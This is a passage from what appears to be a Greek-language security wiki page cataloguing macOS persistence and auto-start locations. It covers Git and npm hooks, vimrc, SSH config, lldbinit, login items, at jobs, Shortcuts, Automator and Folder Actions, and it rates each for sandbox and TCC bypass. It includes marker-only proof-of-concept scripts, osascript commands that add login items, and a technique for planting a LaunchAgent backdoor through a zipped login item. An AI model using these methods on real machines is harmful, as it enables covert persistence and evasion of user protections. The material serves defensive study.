Το Karabiner-Elements δεν ήταν εγκατεστημένο στο `/Applications` στο δοκιμαστικό μηχάνημα macOS 26.5.2, επομένως πρόκειται για PoC που τεκμηριώνεται από την επίσημη τεκμηρίωση και όχι για αποτέλεσμα τοπικής εκτέλεσης.

### Git hooks σε τοπικό repository

- **Στόχος εγγραφής:** Ένα εκτελέσιμο hook, όπως το `<repo>/.git/hooks/post-checkout`. Αν έχει ήδη οριστεί το `core.hooksPath`, χρησιμοποιήστε τον διαμορφωμένο κατάλογο. Ένα hook που έχει καταχωριστεί ως συνηθισμένο tracked source file δεν εγκαθίσταται αυτόματα σε ένα clone.
- **Trigger:** Η αντίστοιχη λειτουργία του Git. Για παράδειγμα, το `post-checkout` εκτελείται μετά από `git checkout` ή `git switch` και μπορεί επίσης να εκτελεστεί μετά τη δημιουργία clone ή worktree. Η [αναφορά hooks του Git](https://git-scm.com/docs/githooks) παραθέτει τα συμβάντα και την απαίτηση για executable bit· το [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) αλλάζει τον κατάλογο αναζήτησης.
- **Ταυτότητα εκτέλεσης:** Ο λογαριασμός που εκτελεί το Git. Το hook μπορεί να εκτελεστεί μόνο αν ο χρήστης που το ενεργοποιεί έχει δικαίωμα εγγραφής στον ενεργό κατάλογο hooks του repository και εκτελέσει αργότερα τη σχετική λειτουργία του Git.

Αυτό το PoC, που δημιουργεί μόνο έναν δείκτη, δημιουργεί ένα πλήρως αναλώσιμο repository, εγκαθιστά ένα hook και αλλάζει branch. Εκτελέστηκε με επιτυχία με το Apple Git 2.50.1 σε macOS 26.5.2:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### npm lifecycle scripts σε ένα project

- **Στόχος εγγραφής:** Ο χάρτης `scripts` στο `package.json` ενός project με δυνατότητα εγγραφής ή σε ένα εγκατεστημένο dependency package του οποίου το lifecycle script θα εκτελέσει ο χρήστης. Αυτό είναι ένα hook στη ροή εργασιών ανάπτυξης, όχι εκτέλεση κατά το άνοιγμα ενός directory.
- **Trigger και ταυτότητα:** Ένα μεταγενέστερο `npm install` ή `npm ci`, όταν επιτρέπονται τα lifecycle scripts, εκτελεί τα `preinstall`, `install` και `postinstall` ως ο χρήστης που εκτελεί το npm. Ένα συνηθισμένο `npm run <name>` εκτελεί επίσης τα αντίστοιχα scripts `pre<name>` και `post<name>`. Η [αναφορά lifecycle του npm](https://docs.npmjs.com/cli/v11/using-npm/scripts) παραθέτει τα events· το [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) μπορεί να απενεργοποιήσει τα install lifecycle scripts. Οι ρυθμίσεις έκδοσης και πολιτικής ενδέχεται να αλλάξουν τι επιτρέπεται, οπότε ελέγξτε την έκδοση npm-στόχο.

Αυτό το PoC, που δημιουργεί μόνο ένα marker, εκτελέστηκε με τοπικό npm σε έναν προσωρινό, άδειο directory. Δεν κατεβάζει dependencies ούτε τροποποιεί το project κάποιου χρήστη:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Αυτό διαφέρει από τα αρχεία εκκίνησης του Python interpreter: το npm πρέπει να εκτελέσει την αντίστοιχη ενέργεια εγκατάστασης ή εκτέλεσης, ενώ ο κώδικας `site` του Python μπορεί να φορτωθεί κατά τη συνήθη εκκίνηση του interpreter. Αντίστοιχα, οι γενικοί στόχοι `Makefile` και οι ορισμοί εργασιών build απαιτούν από τον χρήστη ή από ένα ήδη ρυθμισμένο εργαλείο να καλέσει τον συγκεκριμένο στόχο· δεν αποτελούν ξεχωριστές διαδρομές αυτόματης εκκίνησης του OS.

### Ρύθμιση εκκίνησης του Vim

- **Στόχος εγγραφής:** `~/.vimrc` για τον χρήστη που θα εκκινήσει το Vim (ή άλλο αρχείο εκκίνησης που επιλέγεται από τη σειρά αρχικοποίησης του Vim). Η [αναφορά εκκίνησης του Vim](https://vimhelp.org/starting.txt.html) τεκμηριώνει το αρχείο και τις παρακάμψεις `VIMINIT`/`EXINIT`.
- **Ενεργοποίηση:** Μια επόμενη συνήθης εκκίνηση του Vim που φορτώνει αυτήν τη ρύθμιση. Το Vim με `-u NONE` παρακάμπτει το vimrc του χρήστη. Πρόκειται για εκτέλεση ειδική για τον editor, όχι για ενεργοποίηση κατά τη σύνδεση στο OS.
- **Ταυτότητα εκτέλεσης:** Ο λογαριασμός του χρήστη του Vim.

Το ακόλουθο απομονωμένο PoC εκτελέστηκε με το `/usr/bin/vim` του macOS· δεν γράφει πραγματικές προτιμήσεις του Vim ούτε ανοιχτά έγγραφα:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Το Neovim έχει ξεχωριστή διαδρομή ρυθμίσεων χρήστη, `$XDG_CONFIG_HOME/nvim/init.lua` ή `init.vim`, και φορτώνει επίσης scripts στους καταλόγους runtime `plugin/`, σύμφωνα με την [τεκμηρίωση εκκίνησης](https://neovim.io/doc/user/starting/). Το Neovim δεν ήταν εγκατεστημένο στο macOS 26.5.2 test machine, επομένως αυτή η παραλλαγή δεν εκτελέστηκε εκεί.

### Εντολές ρύθμισης SSH client

- **Στόχος εγγραφής:** `~/.ssh/config` ή κάποιο άλλο αρχείο που ήδη περιλαμβάνει. Αυτό είναι αρχείο ρυθμίσεων **client**· είναι ξεχωριστό από το server-side `~/.ssh/rc` που περιγράφεται παρακάτω.
- **Ενεργοποίηση:** Μια αντίστοιχη κλήση `ssh`. Το `Match exec` εκτελεί μια τοπική εντολή όσο ο client αξιολογεί τις ρυθμίσεις του, ακόμη και με `ssh -G`, που εμφανίζει τις ρυθμίσεις χωρίς σύνδεση. Το `ProxyCommand` εκτελείται όταν ο client προετοιμάζει μια αντίστοιχη σύνδεση. Το `LocalCommand` εκτελείται μόνο μετά από επιτυχή σύνδεση και απαιτεί `PermitLocalCommand yes` (η προεπιλογή είναι `no`). Αυτά έχουν διαφορετικό χρόνο εκτέλεσης και προϋποθέσεις· η εγγραφή από μόνη της δεν τα εκτελεί. Δείτε το upstream [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Ταυτότητα εκτέλεσης:** Ο τοπικός χρήστης που εκτελεί το `ssh`. Απαιτούνται αντιστοιχία host, κατάλληλο αρχείο ρυθμίσεων και, όπου χρειάζεται, σύνδεση. Το `ssh -F` μπορεί να επιλέξει διαφορετικό αρχείο ρυθμίσεων.

Αυτό το PoC μόνο με marker εκτελέστηκε με το SSH client της Apple στο macOS 26.5.2. Το `-G` δοκιμάζει το `Match exec` χωρίς να πραγματοποιεί σύνδεση δικτύου ή να διαβάζει το πραγματικό SSH configuration του χρήστη:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Αρχεία αρχικοποίησης του debugger

- **Στόχος εγγραφής:** `~/.lldbinit` ή το αρχείο ειδικά για την εφαρμογή με υψηλότερη προτεραιότητα, όπως το `~/.lldbinit-lldb`. Το LLDB διαβάζει ένα αρχείο κατά την εκκίνηση του debugger. Ένα `.lldbinit` στον τρέχοντα κατάλογο **δεν** εκτελείται από προεπιλογή· ο χρήστης πρέπει να ενεργοποιήσει το `target.load-cwd-lldbinit` ή να περάσει την παράμετρο `--local-lldbinit`. Δείτε το [εγχειρίδιο LLDB](https://lldb.llvm.org/man/lldb.html).
- **Ενεργοποίηση και ταυτότητα:** Ο χρήστης εκκινεί το LLDB χωρίς `--no-lldbinit`· οι εντολές εκτελούνται ως αυτός ο χρήστης. Το απλό άνοιγμα ενός project δεν σημαίνει ότι εκτελείται το `.lldbinit` του project.

Η ακόλουθη δοκιμή μόνο με δείκτη εκτελέστηκε στο LLDB σε macOS 26.5.2, με απομονωμένο home και κατάλογο εργασίας:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

Για το **GDB**, η [upstream τεκμηρίωση εκκίνησης](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) αναφέρει τα `$HOME/Library/Preferences/gdb/gdbinit` και στη συνέχεια το `~/.gdbinit` στο macOS. Ένα `.gdbinit` στον τρέχοντα κατάλογο υπόκειται στη [διαδρομή ασφαλούς αυτόματης φόρτωσης](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), ενώ τα `-nx`/`-nh` παραλείπουν τα αρχεία αρχικοποίησης. Το GDB δεν ήταν εγκατεστημένο στο Mac δοκιμών, επομένως αυτή η παραλλαγή δεν δοκιμάστηκε τοπικά.

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ωστόσο, το ssh πρέπει να είναι ενεργοποιημένο και να χρησιμοποιείται
- Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
  - Η χρήση SSH για πρόσβαση FDA

#### Τοποθεσία

- **`~/.ssh/rc`**
  - **Ενεργοποίηση**: Σύνδεση μέσω ssh
- **`/etc/ssh/sshrc`**
  - Απαιτούνται δικαιώματα root
  - **Ενεργοποίηση**: Σύνδεση μέσω ssh

> [!CAUTION]
> Για να ενεργοποιηθεί το ssh απαιτείται Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Περιγραφή & Εκμετάλλευση

Από προεπιλογή, εκτός αν έχει οριστεί `PermitUserRC no` στο `/etc/ssh/sshd_config`, όταν ένας χρήστης **συνδέεται μέσω SSH**, εκτελούνται τα scripts **`/etc/ssh/sshrc`** και **`~/.ssh/rc`**.<sup>[[14]](#references)</sup>

### **Στοιχεία σύνδεσης**

Αναφορά: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ωστόσο, πρέπει να εκτελέσετε το `osascript` με args
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσίες

- **Εγγεγραμμένη βοηθητική εφαρμογή στοιχείου σύνδεσης:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (συνήθης τοποθεσία εντός πακέτου).
  - **Ενεργοποίηση:** Η εγγραφή μπορεί να εκκινήσει αμέσως τη βοηθητική εφαρμογή· στη συνέχεια, εκκινείται σε επόμενες συνδέσεις χρηστών, εφόσον έχει εγκριθεί.
- **Εγγεγραμμένος agent/daemon εντός πακέτου:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` ή `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Ενεργοποίηση:** Ένας εγκεκριμένος agent μπορεί να εκκινηθεί κατά την εγγραφή και στις επόμενες συνδέσεις· ένας εγκεκριμένος daemon εκκινείται κατά την εκκίνηση του συστήματος. Για έναν daemon απαιτείται έγκριση διαχειριστή.

#### Περιγραφή

Στις **Ρυθμίσεις συστήματος → Γενικά → Στοιχεία σύνδεσης και επεκτάσεις**, οι χρήστες μπορούν να ελέγχουν τα στοιχεία σύνδεσης και παρασκηνίου. Το macOS 13 και οι νεότερες εκδόσεις παρέχουν το [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) για την εγγραφή στοιχείων σύνδεσης, launch agents και launch daemons που περιλαμβάνονται σε πακέτα. Η [συμπεριφορά του `register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) διαφέρει ανάλογα με τον τύπο και την κατάσταση έγκρισης. **Η εγγραφή μιας βοηθητικής εφαρμογής σε ένα πακέτο εφαρμογής δεν αρκεί για να καταχωριστεί ένα νέο στοιχείο σύνδεσης.** Αντίθετα, αν ένα ήδη εγγεγραμμένο εκτελέσιμο αρχείο βοηθητικής εφαρμογής είναι εγγράψιμο, η τροποποίησή του μπορεί να επηρεάσει την επόμενη εκκίνησή του χωρίς νέα εγγραφή· πρώτα επαληθεύστε την πραγματική διαδρομή και τους ελέγχους υπογραφής κώδικα.

Ακολουθεί ένας τρόπος μόνο για ανάγνωση, για την αναζήτηση βοηθητικών εφαρμογών που περιλαμβάνονται σε πακέτα σε Mac· δεν εγγράφει ούτε εκκινεί καμία από αυτές:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Για ένα plist εκκίνησης που περιλαμβάνεται σε bundle, επιλύστε το `BundleProgram` **σε σχέση με τη ρίζα του app bundle** (για παράδειγμα, `Contents/MacOS/Helper`), όπως ορίζουν οι [οδηγίες της Apple για τη μετάβαση του Service Management](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos). Μια απογραφή μόνο για ανάγνωση του `/Applications` στο Mac της έρευνας εντόπισε 14 εγγραφές bundled helper και πέντε δηλώσεις `BundleProgram`· και οι πέντε στόχοι επιλύθηκαν, ενώ δύο πέρασαν τον έλεγχο δυνατότητας εγγραφής από τον χρήστη. Αυτός ο έλεγχος **δεν** αποδεικνύει ότι κάποιο από τα δύο helper είναι καταχωρισμένο, ενεργοποιημένο, εκτελέσιμο μετά την επικύρωση της υπογραφής ή προσβάσιμο από sandbox. Το `sfltool dumpbtm` εμφάνισε 150 ονομασμένες εγγραφές σε αυτό το Mac· είναι βοήθημα επιθεώρησης και όχι δοκιμή που επιβεβαιώνει ότι εκτελείται κάθε εγγραφή.

Τα παλαιότερα στοιχεία σύνδεσης μπορούν επίσης να διαχειρίζονται μέσω Apple events. Μπορείτε να τα εμφανίσετε, να τα προσθέσετε και να τα αφαιρέσετε από τη γραμμή εντολών, αν και η προσθήκη τους αλλάζει τις μόνιμες ρυθμίσεις σύνδεσης του χρήστη και ενδέχεται να απαιτεί έγκριση Automation:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` είναι λεπτομέρεια υλοποίησης, όχι υποστηριζόμενη τοποθεσία για εγκατάσταση payload απλώς γράφοντας ένα αρχείο. Το παλαιότερο API `SMLoginItemSetEnabled` έχει αντικατασταθεί για νέους helpers από το `SMAppService`· η διαδρομή `/var/db/com.apple.xpc.launchd/loginitems.501.plist` που αναφερόταν παλαιότερα στη σελίδα δεν υπήρχε στο δοκιμαστικό μηχάνημα με macOS 26.5.2. Κατά την αξιολόγηση σύγχρονων login items, χρησιμοποιήστε το API καταχώρισης και την κατάσταση στο system UI, όχι μια υποτιθέμενη διαδρομή βάσης δεδομένων.

### ZIP ως Login Item

(Δείτε την προηγούμενη ενότητα σχετικά με τα Login Items· αυτή είναι μια επέκταση.)

Αν αποθηκεύσετε ένα αρχείο **ZIP** ως **Login Item**, το **`Archive Utility`** θα το ανοίξει. Αν, για παράδειγμα, το zip ήταν αποθηκευμένο στο **`~/Library`** και περιείχε τον φάκελο **`LaunchAgents/file.plist`** με ένα backdoor, ο φάκελος θα δημιουργηθεί (δεν υπάρχει από προεπιλογή) και το plist θα προστεθεί, ώστε την επόμενη φορά που θα συνδεθεί ξανά ο χρήστης, να **εκτελεστεί το backdoor που υποδεικνύεται στο plist**.

Μια άλλη επιλογή θα ήταν να δημιουργήσετε τα αρχεία **`.bash_profile`** και **`.zshenv`** μέσα στο HOME του χρήστη, ώστε αυτή η τεχνική να λειτουργεί ακόμη κι αν ο φάκελος LaunchAgents υπάρχει ήδη.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Αλλά πρέπει να **εκτελέσετε** το **`at`** και να είναι **ενεργοποιημένο**
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- Πρέπει να **εκτελέσετε** το **`at`** και να είναι **ενεργοποιημένο**

#### **Περιγραφή**

Οι εργασίες `at` έχουν σχεδιαστεί για **τον προγραμματισμό εφάπαξ εργασιών** που θα εκτελεστούν σε συγκεκριμένες χρονικές στιγμές. Σε αντίθεση με τις εργασίες cron, οι εργασίες `at` αφαιρούνται αυτόματα μετά την εκτέλεσή τους. Είναι σημαντικό να σημειωθεί ότι αυτές οι εργασίες διατηρούνται μετά από επανεκκινήσεις του συστήματος, γεγονός που υπό ορισμένες συνθήκες τις καθιστά πιθανή απειλή για την ασφάλεια.<sup>[[16]](#references)</sup>

Το ενσωματωμένο `com.apple.atrun.plist` έχει `Disabled = true`, αλλά το launchd διατηρεί χωριστά τις ενεργές παρακάμψεις ενεργοποίησης/απενεργοποίησης. Στο δοκιμαστικό μηχάνημα με macOS 26.5.2, η εντολή `launchctl print-disabled system` ανέφερε το `com.apple.atrun` ως **ενεργοποιημένο**, παρά το ενσωματωμένο αυτό κλειδί. Ελέγξτε την ενεργή κατάσταση πριν ισχυριστείτε ότι οι εργασίες `at` θα εκτελεστούν:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Ένας διαχειριστής μπορεί να ενεργοποιήσει μια απενεργοποιημένη υπηρεσία `atrun` με το `launchctl`· το ακόλουθο ιστορικό παράδειγμα αλλάζει την κατάσταση μιας υπηρεσίας συστήματος και **δεν** εκτελέστηκε στο Mac όπου έγινε η έρευνα:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Αυτό θα δημιουργήσει ένα αρχείο σε 1 ώρα:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Έλεγξε την ουρά εργασιών χρησιμοποιώντας `atq:`ેણ

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Παραπάνω βλέπουμε δύο προγραμματισμένες εργασίες. Μπορούμε να εμφανίσουμε τις λεπτομέρειες μιας εργασίας χρησιμοποιώντας το `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> Αν οι εργασίες AT δεν είναι ενεργοποιημένες, οι εργασίες που δημιουργούνται δεν θα εκτελεστούν.

Τα **αρχεία job** βρίσκονται στο `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Το όνομα του αρχείου περιέχει την ουρά, τον αριθμό της εργασίας και την ώρα που έχει προγραμματιστεί να εκτελεστεί. Για παράδειγμα, ας ρίξουμε μια ματιά στο `a0001a019bdcd2`.

- `a` - αυτή είναι η ουρά
- `0001a` - αριθμός εργασίας σε δεκαεξαδική μορφή, `0x1a = 26`
- `019bdcd2` - ώρα σε δεκαεξαδική μορφή. Αντιπροσωπεύει τα λεπτά που έχουν περάσει από το epoch. Το `0x019bdcd2` είναι `26991826` σε δεκαδική μορφή. Αν το πολλαπλασιάσουμε επί 60, παίρνουμε `1619509560`, που αντιστοιχεί σε `GMT: 2021. April 27., Tuesday 7:46:00`.

Αν εκτυπώσουμε το αρχείο της εργασίας, διαπιστώνουμε ότι περιέχει τις ίδιες πληροφορίες που λάβαμε χρησιμοποιώντας το `at -c`.

### Ειδοποιήσεις ημερολογίου για άνοιγμα αρχείου

- **Στόχος εγγραφής:** Ένα εκτελέσιμο app bundle ή άλλο αρχείο **που έχει ήδη επιλεγεί** από μια προσαρμοσμένη ειδοποίηση **Open file** ενός συμβάντος του Calendar. Η δημιουργία ή επεξεργασία της ίδιας της ειδοποίησης απαιτεί πρόσβαση στο συγκεκριμένο συμβάν μέσω του Calendar ή μιας αποδεκτής πηγής δεδομένων ημερολογίου· η τυχαία εγγραφή ενός αρχείου δεν δημιουργεί ειδοποίηση.
- **Ενεργοποίηση:** Την προγραμματισμένη ώρα της ειδοποίησης, σε Mac όπου το Calendar επεξεργάζεται το συμβάν. Ένα επαναλαμβανόμενο συμβάν μπορεί να επαναλαμβάνει την ενέργεια. Ο [τρέχων οδηγός Calendar της Apple](https://support.apple.com/guide/calendar/icl1012/mac) επιβεβαιώνει την επιλογή ειδοποίησης **Custom → Open file** στο macOS 26.
- **Ταυτότητα εκτέλεσης και περιορισμοί:** Το Calendar ανοίγει το επιλεγμένο αρχείο για τον συνδεδεμένο χρήστη μέσω της συσχετισμένης εφαρμογής. Η εκκίνηση ενός app bundle μπορεί να εκτελέσει τον κώδικά του ως αυτός ο χρήστης, υπό τους περιορισμούς του Gatekeeper, του quarantine και άλλων ελέγχων του macOS. Ένα απλό αρχείο script μπορεί απλώς να ανοίξει σε πρόγραμμα επεξεργασίας· η επέκτασή του από μόνη της δεν αποδεικνύει ότι εκτελείται κώδικας.

Για να αξιολογήσετε με ασφάλεια ένα υποψήφιο αρχείο, ελέγξτε την ειδοποίηση του συμβάντος στο Calendar και τα δικαιώματα του επιλεγμένου αρχείου. Αυτή η διαδρομή τεκμηριώθηκε με βάση τον οδηγό της Apple και **δεν** δοκιμάστηκε στο Mac της έρευνας, επειδή η δοκιμή θα τροποποιούσε ένα ενεργό ημερολόγιο και θα απαιτούσε αναμονή για ένα συμβάν επιφάνειας εργασίας. Σε έναν προσωρινό λογαριασμό, μια δοκιμή μπορεί να επιλέξει ένα app bundle που δημιουργεί μόνο ένα marker, να ορίσει μια κοντινή ειδοποίηση Open file, να επιβεβαιώσει την εκκίνηση και στη συνέχεια να διαγράψει το συμβάν και την εφαρμογή.

### Αυτοματισμοί Shortcuts στο macOS

- **Στόχος εγγραφής:** Ένα εκτελέσιμο αρχείο **που ήδη αναφέρεται** σε μια ενέργεια shortcut ή ένα υπάρχον shortcut που μπορεί να επεξεργαστεί ένας εξουσιοδοτημένος χρήστης. Ένα τυχαίο αρχείο `.shortcut` ή η εγγραφή σε μια μη τεκμηριωμένη βάση δεδομένων του Shortcuts δεν αποτελεί υποστηριζόμενη μέθοδο καταχώρισης αυτοματισμού.
- **Ενεργοποίηση και ταυτότητα:** Ένα συμβάν αυτοματισμού που έχει ήδη διαμορφωθεί και ενεργοποιηθεί, όπως η ώρα της ημέρας ή ένα συμβάν εφαρμογής, εκτελεί το shortcut για τον συνδεδεμένο χρήστη. Ο [τρέχων οδηγός αυτοματισμών Mac της Apple](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) παραθέτει τα υποστηριζόμενα συμβάντα, εξηγεί πότε ένας αυτοματισμός μπορεί να εκτελεστεί χωρίς να ζητήσει επιβεβαίωση και περιγράφει πώς αφαιρείται ένας trigger. Ο [οδηγός απορρήτου Shortcuts της Apple](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) απαιτεί την επιλογή **Allow Running Scripts** για ενέργειες script, ενώ μεμονωμένες ενέργειες ενδέχεται και πάλι να ζητήσουν δικαιώματα.

Αυτή η διαδρομή από εγγραφή σε εκτέλεση είναι υπό όρους και ισχύει **μόνο όταν η υπάρχουσα ενέργεια φορτώνει έναν εγγράψιμο στόχο**. Η δημιουργία νέου αυτοματισμού μέσω του UI αλλάζει ενεργές ρυθμίσεις και δεν επιχειρήθηκε στο Mac της έρευνας. Σε έναν προσωρινό λογαριασμό, ο κάτοχος μπορεί να διαμορφώσει ένα shortcut συγκεκριμένης ώρας της ημέρας, του οποίου το script αγγίζει το `/tmp/ht-shortcuts-marker`, να ενεργοποιήσει τα απαραίτητα δικαιώματα, να επιβεβαιώσει τη δημιουργία του marker μετά το συμβάν και έπειτα να διαγράψει τον αυτοματισμό, το shortcut και το marker.

### Ενέργειες Automator και Quick Actions

- **Στόχοι εγγραφής:** `~/Library/Automator/*.action` (χρήστης) και `/Library/Automator/*.action` (διαχειριστής) για action bundles. Μια αποθηκευμένη ροή εργασίας Quick Action βρίσκεται συνήθως στο `~/Library/Services/*.workflow`· ελέγξτε την πραγματική διαδρομή της ροής εργασίας που έχει επιλέξει ο χρήστης. Η [αναφορά πλαισίου Automator της Apple](https://developer.apple.com/documentation/automator) παραθέτει τους καταλόγους αναζήτησης των ενεργειών.
- **Ενεργοποίηση:** Το Automator φορτώνει τα διαθέσιμα action bundles κατά την εκκίνησή του, αλλά η εργασία μιας ενέργειας εκτελείται όταν εκτελείται μια ροή εργασίας που τη χρησιμοποιεί. Μια Quick Action εκτελείται όταν ο χρήστης την επιλέγει από το Finder, τις Υπηρεσίες ή άλλο διαθέσιμο μενού. Μια ροή εργασίας Folder Action εκτελείται όταν προστίθενται στοιχεία στον φάκελό της που είναι **ήδη συνδεδεμένος**, ενώ μια ροή εργασίας Calendar Alarm εκτελείται την ώρα του συμβάντος της. Οι [τύποι ροών εργασίας της Apple](https://support.apple.com/guide/automator/aut7cac58839/mac) διακρίνουν αυτά τα συμβάντα. Η απλή εγγραφή μιας ενέργειας ή ροής εργασίας δεν συνδέει φάκελο ούτε προγραμματίζει συμβάν ημερολογίου.
- **Ταυτότητα εκτέλεσης και περιορισμοί:** Ο λογαριασμός που εκτελεί τη ροή εργασίας· το Automator ή η εφαρμογή που την καλεί πρέπει να φορτώσει την ενέργεια και οι ισχύοντες έλεγχοι υπογραφής κώδικα ή απορρήτου πρέπει να επιτρέψουν την εκτέλεσή της. Ένα εγγράψιμο action bundle που ήδη αναφέρεται από μια ενεργή ροή εργασίας είναι διαφορετική περίπτωση από την εγκατάσταση μιας νέας ενέργειας και την αναμονή μέχρι να επιλεγεί.

Οι κατάλογοι χρήστη `Automator` και `Services` υπήρχαν στο δοκιμαστικό Mac με macOS 26.5.2· ο `/Library/Automator` απουσίαζε. Δεν δημιουργήθηκε, δεν συνδέθηκε και δεν εκτελέστηκε καμία ενεργή ροή εργασίας. Χρησιμοποιήστε έναν προσωρινό λογαριασμό και μια ενέργεια/ροή εργασίας που δημιουργεί μόνο ένα marker, για να επιβεβαιώσετε μια συγκεκριμένη διαδρομή φόρτωσης. Η ξεχωριστή ενότητα [Folder Actions](#folder-actions) καλύπτει λεπτομερέστερα αυτή την πηγή συμβάντων.

### Folder Actions

Συγγραφή: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Συγγραφή: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ωστόσο, πρέπει να μπορείτε να καλέσετε το `osascript` με ορίσματα για να επικοινωνήσετε με το **`System Events`**, ώστε να διαμορφώσετε το Folder Actions
- Παράκαμψη TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Διαθέτει ορισμένα βασικά δικαιώματα TCC, όπως για τα Desktop, Documents και Downloads

#### Τοποθεσία

- **`/Library/Scripts/Folder Action Scripts`**
  - Απαιτούνται δικαιώματα root
  - **Ενεργοποίηση**: Πρόσβαση στον καθορισμένο φάκελο
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Ενεργοποίηση**: Πρόσβαση στον καθορισμένο φάκελο

